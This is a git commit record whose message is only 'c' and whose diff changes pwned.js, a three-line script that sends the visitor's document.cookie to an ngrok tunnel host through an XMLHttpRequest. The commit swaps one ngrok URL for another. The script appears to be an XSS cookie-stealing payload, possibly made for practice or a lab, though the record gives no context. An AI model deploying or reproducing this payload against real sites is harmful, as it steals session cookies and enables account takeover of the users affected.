381b2e0d4603ba0e441a74436ab0d70d4327dc0d
aitortxu20 <aitortxuboy@gmail.com>
2023-12-02 21:38:08 +0100

    c

--- pwned.js
+++ pwned.js
@@ -1,4 +1,4 @@
 var request = new XMLHttpRequest();
-request.open('GET', 'http://99c6-90-173-214-195.ngrok-free.app/?cookie=' + document.cookie);
+request.open('GET', ' http://070c-90-173-214-195.ngrok-free.app/?cookie=' + document.cookie);
 request.send();
 
